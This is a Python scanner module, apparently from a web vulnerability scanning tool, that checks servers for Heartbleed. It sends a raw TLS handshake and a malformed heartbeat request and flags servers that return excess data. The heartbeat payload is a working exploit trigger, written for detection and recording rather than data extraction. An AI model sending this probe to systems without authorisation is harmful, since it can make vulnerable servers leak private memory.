import os.path
import codecs
import socket
import time
import select
import struct

from utils.output import Output
from utils.db import DB
from lib.httpscan.http import HTTP

"""
Taken from: https://gist.github.com/sh1n0b1/10100394
"""

class Module:
    name = 'Heartbleed'
    description = 'Check if server is vulnerable to heartbleed'

    def run(self, target, args, useragent, proxy, timeout, safe):
        if target['method'] != 'https':
            pass

        url = 'https://%s:%d/' % (target['hostname'], target['port'])

        try:
            sock = socket.socket()
            sock.connect((target['hostname'], target['port']))
            sock.send(hello)

            while True:
                typ, ver, pay = recvmsg(sock)
                if typ == None:
                    return
                # Look for server hello done message.
                if typ == 22 and pay[0] == 0x0E:
                    break

            sock.send(hb)

            if hit_hb(sock):
                Output.vuln({'target': url, 'message': 'Vulnerable to heartbleed'})

                vuln_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'service': 'http',
                    'url': url,
                    'name': 'Heartbleed',
                    'description': 'Server %s is vulnerable to Heartbleed' % url,
                }
                DB.insert_vulnerability(vuln_info)

        except ConnectionResetError as e:
            pass
        except TimeoutError as e:
            pass


decode_hex = codecs.getdecoder('hex_codec')

def h2bin(x):
    return decode_hex(x.replace(' ', '').replace('\n', ''))[0]

hello = h2bin('''
    16 03 02 00  dc 01 00 00 d8 03 02 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01
    ''')

hb = h2bin('''
    18 03 02 00 03
    01 40 00
    ''')


def hexdump(s):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print( '  %04x: %-48s %s' % (b, hxdat, pdat))
    print()

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
    return typ, ver, pay

def hit_hb(s):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            # No heartbeat response received, server likely not vulnerable
            return False

        if typ == 24:
            if len(pay) > 3:
                # WARNING: server returned more data than it should - server is vulnerable!
                return True
            else:
                # Server processed malformed heartbeat, but did not return any extra data.
                return False

        if typ == 21:
            # Server returned error, likely not vulnerable
            return False



